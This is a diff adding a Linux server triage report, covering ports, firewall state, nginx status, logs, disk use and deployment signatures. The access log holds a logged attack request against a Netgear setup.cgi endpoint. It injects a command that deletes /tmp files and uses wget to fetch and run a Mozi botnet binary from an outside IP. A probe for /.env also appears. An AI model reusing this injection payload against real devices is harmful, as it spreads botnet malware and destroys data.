@@ -1,0 +1,128 @@
+=== TRIAGE SCRIPT OUTPUT ===
+============================================
+  LINUX HEALTH CHECK - TRIAGE REPORT
+  Fri Jul 17 18:11:34 UTC 2026
+============================================
+
+[NETWORK] IP Addresses:
+127.0.0.1/8
+172.31.24.63/20
+
+[NETWORK] Listening Ports:
+Netid State  Recv-Q Send-Q     Local Address:Port Peer Address:PortProcess                                                                             
+udp   UNCONN 0      0             127.0.0.54:53        0.0.0.0:*           uid:989 ino:38997 sk:1 cgroup:/system.slice/systemd-resolved.service <->    
+udp   UNCONN 0      0          127.0.0.53%lo:53        0.0.0.0:*           uid:989 ino:38995 sk:2 cgroup:/system.slice/systemd-resolved.service <->    
+udp   UNCONN 0      0      172.31.24.63%ens5:68        0.0.0.0:*           uid:998 ino:296095 sk:1004 cgroup:/system.slice/systemd-networkd.service <->
+udp   UNCONN 0      0              127.0.0.1:323       0.0.0.0:*           ino:8958 sk:4 cgroup:/system.slice/chrony.service <->                       
+udp   UNCONN 0      0                  [::1]:323          [::]:*           ino:8959 sk:5 cgroup:/system.slice/chrony.service v6only:1 <->              
+tcp   LISTEN 0      4096          127.0.0.54:53        0.0.0.0:*           uid:989 ino:38998 sk:6 cgroup:/system.slice/systemd-resolved.service <->    
+tcp   LISTEN 0      4096       127.0.0.53%lo:53        0.0.0.0:*           uid:989 ino:38996 sk:8 cgroup:/system.slice/systemd-resolved.service <->    
+tcp   LISTEN 0      4096             0.0.0.0:22        0.0.0.0:*           ino:21213 sk:9 cgroup:/system.slice/ssh.socket <->                          
+tcp   LISTEN 0      511              0.0.0.0:80        0.0.0.0:*           ino:219884 sk:1001 cgroup:/system.slice/nginx.service <->                   
+tcp   LISTEN 0      4096                [::]:22           [::]:*           ino:21215 sk:b cgroup:/system.slice/ssh.socket v6only:1 <->                 
+tcp   LISTEN 0      511                 [::]:80           [::]:*           ino:219885 sk:1002 cgroup:/system.slice/nginx.service v6only:1 <->          
+
+[NETWORK] Firewall Status:
+Status: inactive
+
+[SERVICE] Nginx Status:
+● nginx.service - A high performance web server and a reverse proxy server
+     Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; preset: enabled)
+     Active: active (running) since Thu 2026-07-16 16:00:19 UTC; 1 day 2h ago
+ Invocation: 2f6bfd2d870e4d6a8dba8aefb6456830
+       Docs: man:nginx(8)
+    Process: 86282 ExecReload=/usr/sbin/nginx -g daemon on; master_process on; -s reload (code=exited, status=0/SUCCESS)
+   Main PID: 67974 (nginx)
+      Tasks: 3 (limit: 627)
+     Memory: 4.7M (peak: 7.8M)
+        CPU: 174ms
+     CGroup: /system.slice/nginx.service
+             ├─67974 "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;"
+             ├─86283 "nginx: worker process"
+             └─86284 "nginx: worker process"
+
+
+[SERVICE] Nginx Config Test:
+nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
+nginx: configuration file /etc/nginx/nginx.conf test is successful
+
+[SERVICE] Nginx Port 80:
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
+LISTEN 0      511             [::]:80           [::]:*          
+
+[LOGS] Access Log (last 10):
+183.92.205.84 - - [17/Jul/2026:17:35:08 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://183.92.205.84:44151/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
+43.157.179.227 - - [17/Jul/2026:17:35:42 +0000] "GET /privacy.html HTTP/1.1" 200 1652 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.157.82.252 - - [17/Jul/2026:17:57:19 +0000] "GET / HTTP/1.1" 200 5922 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+82.21.248.112 - - [17/Jul/2026:18:02:20 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+82.21.248.112 - - [17/Jul/2026:18:02:20 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+::1 - - [17/Jul/2026:18:03:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.18.0"
+::1 - - [17/Jul/2026:18:04:45 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.18.0"
+::1 - - [17/Jul/2026:18:04:45 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.18.0"
+::1 - - [17/Jul/2026:18:04:45 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.18.0"
+::1 - - [17/Jul/2026:18:11:04 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.18.0"
+
+[LOGS] Error Log (last 10):
+
+[LOGS] Journalctl (last 10):
+Jul 16 16:00:19 ip-172-31-24-63 systemd[1]: nginx.service: Deactivated successfully.
+Jul 16 16:00:19 ip-172-31-24-63 systemd[1]: Stopped nginx.service - A high performance web server and a reverse proxy server.
+Jul 16 16:00:19 ip-172-31-24-63 systemd[1]: Starting nginx.service - A high performance web server and a reverse proxy server...
+Jul 16 16:00:19 ip-172-31-24-63 systemd[1]: Started nginx.service - A high performance web server and a reverse proxy server.
+Jul 16 16:22:34 ip-172-31-24-63 systemd[1]: Reloading nginx.service - A high performance web server and a reverse proxy server...
+Jul 16 16:22:34 ip-172-31-24-63 nginx[69005]: 2026/07/16 16:22:34 [notice] 69005#69005: signal process started
+Jul 16 16:22:34 ip-172-31-24-63 systemd[1]: Reloaded nginx.service - A high performance web server and a reverse proxy server.
+Jul 17 18:04:45 ip-172-31-24-63 systemd[1]: Reloading nginx.service - A high performance web server and a reverse proxy server...
+Jul 17 18:04:45 ip-172-31-24-63 nginx[86282]: 2026/07/17 18:04:45 [notice] 86282#86282: signal process started
+Jul 17 18:04:45 ip-172-31-24-63 systemd[1]: Reloaded nginx.service - A high performance web server and a reverse proxy server.
+
+[RESOURCES] Uptime:
+ 18:11:34 up 2 days, 35 min,  1 user,  load average: 0.03, 0.01, 0.00
+
+[RESOURCES] Memory:
+               total        used        free      shared  buff/cache   available
+Mem:           908Mi       401Mi       239Mi       3.6Mi       452Mi       506Mi
+Swap:             0B          0B          0B
+
+[RESOURCES] Disk:
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/root       6.7G  4.1G  2.6G  62% /
+
+[RESOURCES] Disk Usage /var:
+0	/var/lock
+0	/var/run
+4.0K	/var/crash
+4.0K	/var/local
+4.0K	/var/mail
+4.0K	/var/opt
+16K	/var/spool
+44K	/var/snap
+56K	/var/tmp
+1.7M	/var/backups
+
+[DEPLOY] Web Root Contents:
+total 76K
+drwxr-xr-x 3 root root 4.0K Jul 16 23:06 .
+drwxr-xr-x 3 root root 4.0K Jul 15 18:25 ..
+-rw-r--r-- 1 root root 1.1K Jul 16 23:06 README.md
+drwxr-xr-x 2 root root 4.0K Jul 16 23:06 images
+-rw-r--r-- 1 root root  21K Jul 16 23:06 index.html
+-rw-r--r-- 1 root root 4.4K Jul 16 23:06 privacy.html
+-rw-r--r-- 1 root root  17K Jul 16 23:06 style.css
+-rw-r--r-- 1 root root 4.5K Jul 16 23:06 terms.html
+
+[DEPLOY] Deployment Signature:
+/var/www/html/README.md:39:<p><strong>Deployed by:</strong> DMI Cohort 2 | Rahul Sharma | Group 4 | Week 1 | 16-01-2026</p>
+/var/www/html/index.html:603:	<p>Deployed by: Eze Favour</p>
+
+[DEPLOY] HTTP Response:
+HTTP/1.1 200 OK
+Server: nginx/1.28.3 (Ubuntu)
+Date: Fri, 17 Jul 2026 18:11:34 GMT
+Content-Type: text/html
+Content-Length: 20792
+
+============================================
+  TRIAGE COMPLETE
+============================================
